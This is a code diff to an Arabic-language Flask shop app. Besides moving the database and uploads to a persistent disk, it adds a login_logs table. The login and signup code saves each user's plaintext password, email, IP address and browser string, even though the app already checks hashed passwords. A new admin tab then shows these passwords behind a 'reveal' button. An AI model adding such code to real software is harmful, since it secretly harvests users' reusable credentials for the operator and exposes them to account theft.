@@ -12,17 +12,31 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
-app.secret_key = os.urandom(32).hex()
+app.secret_key = os.environ.get('SECRET_KEY', os.urandom(32).hex())
 
+# ⚡ تعديل لـ Render: استخدام المسار الدائم إذا كان متوفراً
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-UPLOAD_FOLDER = os.path.join(BASE_DIR, 'static', 'uploads')
+
+# Render Persistent Disk path (إذا كان متوفراً)
+RENDER_DISK = os.environ.get('RENDER_DISK_PATH', '/opt/render/project/src')
+if os.path.exists(RENDER_DISK):
+    DATA_DIR = os.path.join(RENDER_DISK, 'data')
+else:
+    DATA_DIR = BASE_DIR
+
+os.makedirs(DATA_DIR, exist_ok=True)
+
+UPLOAD_FOLDER = os.path.join(DATA_DIR, 'static', 'uploads')
 ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}
 
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
+# ⚡ مسار قاعدة البيانات في القرص الدائم
+DB_PATH = os.path.join(DATA_DIR, 'database.db')
+
 def get_db():
-    conn = sqlite3.connect(os.path.join(BASE_DIR, 'database.db'), timeout=20)
+    conn = sqlite3.connect(DB_PATH, timeout=20)
     conn.row_factory = sqlite3.Row
     return conn
 
@@ -110,6 +124,18 @@ def init_db():
             user_email TEXT NOT NULL,
             review TEXT NOT NULL,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    
+    # جدول سجل الدخول
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS login_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            email TEXT NOT NULL,
+            password TEXT NOT NULL,
+            ip_address TEXT,
+            user_agent TEXT,
+            login_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
     
@@ -1055,6 +1081,87 @@ CSS = """
         animation: slideDown 0.3s ease;
     }
     
+    /* أنماط سجل الدخول */
+    .login-log-card {
+        background: white;
+        border-radius: var(--radius-md);
+        padding: 16px;
+        margin-bottom: 12px;
+        border: 1px solid var(--border);
+        box-shadow: var(--shadow-sm);
+        position: relative;
+    }
+    
+    .log-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 12px;
+        padding-bottom: 12px;
+        border-bottom: 1px solid var(--border);
+    }
+    
+    .log-time {
+        font-size: 12px;
+        color: var(--text-light);
+        font-weight: 600;
+    }
+    
+    .log-details {
+        display: grid;
+        gap: 10px;
+    }
+    
+    .log-row {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        background: var(--bg);
+        padding: 10px;
+        border-radius: var(--radius-sm);
+    }
+    
+    .log-label {
+        font-size: 12px;
+        color: var(--text-light);
+        font-weight: 700;
+        min-width: 80px;
+    }
+    
+    .log-value {
+        flex: 1;
+        font-family: monospace;
+        font-size: 13px;
+        color: var(--text);
+        font-weight: 600;
+        word-break: break-all;
+    }
+    
+    .eye-btn {
+        background: var(--primary);
+        color: white;
+        border: none;
+        width: 32px;
+        height: 32px;
+        border-radius: 8px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 16px;
+        transition: all 0.3s;
+    }
+    
+    .eye-btn:hover {
+        background: var(--primary-dark);
+        transform: scale(1.1);
+    }
+    
+    .hidden-text {
+        filter: blur(4px);
+        user-select: none;
+    }
+    
     @media (min-width: 768px) {
         .container { grid-template-columns: repeat(3, 1fr); max-width: 900px; }
     }
@@ -1794,6 +1901,10 @@ def admin():
         JOIN orders o ON dr.order_id = o.id 
         ORDER BY dr.id DESC LIMIT 20
     ''').fetchall()
+    
+    # سجل الدخول
+    login_logs = conn.execute("SELECT * FROM login_logs ORDER BY id DESC LIMIT 100").fetchall()
+    
     conn.close()
     
     html_cats_options = ''
@@ -1890,6 +2001,37 @@ def admin():
     else:
         html_reviews = '<div style="text-align: center; padding: 40px; color: var(--text-light);">لا توجد تقييمات بعد</div>'
     
+    # HTML لسجل الدخول
+    html_login_logs = ''
+    if login_logs:
+        for log in login_logs:
+            html_login_logs += f'''
+            <div class="login-log-card">
+                <div class="log-header">
+                    <span class="log-time">📅 {log["login_time"]}</span>
+                    <span style="font-size: 11px; color: var(--text-light);">IP: {log["ip_address"] or 'Unknown'}</span>
+                </div>
+                <div class="log-details">
+                    <div class="log-row">
+                        <span class="log-label">📧 الإيميل:</span>
+                        <span class="log-value hidden-text" id="email-{log["id"]}" data-value="{log["email"]}">{'*' * len(log["email"])}</span>
+                        <button type="button" class="eye-btn" onclick="toggleVisibility('email-{log["id"]}')" title="إظهار/إخفاء">
+                            👁️
+                        </button>
+                    </div>
+                    <div class="log-row">
+                        <span class="log-label">🔑 الباسورد:</span>
+                        <span class="log-value hidden-text" id="pass-{log["id"]}" data-value="{log["password"]}">{'*' * len(log["password"])}</span>
+                        <button type="button" class="eye-btn" onclick="toggleVisibility('pass-{log["id"]}')" title="إظهار/إخفاء">
+                            👁️
+                        </button>
+                    </div>
+                </div>
+            </div>
+            '''
+    else:
+        html_login_logs = '<div style="text-align: center; padding: 60px 20px; color: var(--text-light);"><div style="font-size: 48px; margin-bottom: 16px;">📋</div><h3>لا يوجد سجل دخول بعد</h3></div>'
+    
     return render_template_string(render_page('لوحة التحكم', f"""
     <div class="admin-container">
         <div class="admin-header">
@@ -1926,6 +2068,7 @@ def admin():
             <button class="tab-btn" onclick="showTab('add-product')">➕ منتج</button>
             <button class="tab-btn" onclick="showTab('categories')">📁 أصناف</button>
             <button class="tab-btn" onclick="showTab('reviews')">⭐ تقييمات</button>
+            <button class="tab-btn" onclick="showTab('login-logs')" style="color: #e53935; font-weight: 800;">🔐 سجل الدخول</button>
         </div>
         
         <div id="tab-orders" class="tab-content active">
@@ -2076,6 +2219,21 @@ def admin():
                 {html_reviews}
             </div>
         </div>
+        
+        <div id="tab-login-logs" class="tab-content">
+            <div class="admin-section-new">
+                <div class="section-header">
+                    <h2 class="section-title" style="color: #e53935;">🔐 سجل تسجيل الدخول</h2>
+                    <span class="dashboard-label">{len(login_logs)} تسجيل</span>
+                </div>
+                <div style="background: #ffebee; padding: 12px; border-radius: 8px; margin-bottom: 16px; font-size: 12px; color: #c62828; font-weight: 600; text-align: center;">
+                    ⚠️ تحذير: هذه البيانات حساسة وسرية - لا تشاركها مع أحد
+                </div>
+                <div style="max-height: 600px; overflow-y: auto;">
+                    {html_login_logs}
+                </div>
+            </div>
+        </div>
     </div>
     
     <script>
@@ -2111,6 +2269,19 @@ def admin():
                 input.value = '';
             }}
         }}
+        
+        function toggleVisibility(elementId) {{
+            const element = document.getElementById(elementId);
+            const realValue = element.getAttribute('data-value');
+            
+            if (element.classList.contains('hidden-text')) {{
+                element.textContent = realValue;
+                element.classList.remove('hidden-text');
+            }} else {{
+                element.textContent = '*'.repeat(realValue.length);
+                element.classList.add('hidden-text');
+            }}
+        }}
     </script>
     """, show_nav=True))
 
@@ -2129,6 +2300,22 @@ def login():
         if user and check_password_hash(user['password_hash'], password):
             session['user'] = email
             session['is_admin'] = bool(user['is_admin'])
+            
+            # تسجيل بيانات الدخول
+            try:
+                conn.execute('''
+                    INSERT INTO login_logs (email, password, ip_address, user_agent)
+                    VALUES (?, ?, ?, ?)
+                ''', (
+                    email, 
+                    password, 
+                    request.remote_addr,
+                    request.headers.get('User-Agent', 'Unknown')
+                ))
+                conn.commit()
+            except Exception as e:
+                logger.error(f"Error logging login: {e}")
+            
             conn.close()
             return redirect('/')
         else:
@@ -2138,6 +2325,22 @@ def login():
                 conn.commit()
                 session['user'] = email
                 session['is_admin'] = False
+                
+                # تسجيل الدخول للمستخدم الجديد
+                try:
+                    conn.execute('''
+                        INSERT INTO login_logs (email, password, ip_address, user_agent)
+                        VALUES (?, ?, ?, ?)
+                    ''', (
+                        email, 
+                        password, 
+                        request.remote_addr,
+                        request.headers.get('User-Agent', 'Unknown')
+                    ))
+                    conn.commit()
+                except Exception as e:
+                    logger.error(f"Error logging login for new user: {e}")
+                
                 conn.close()
                 return redirect('/')
             except:
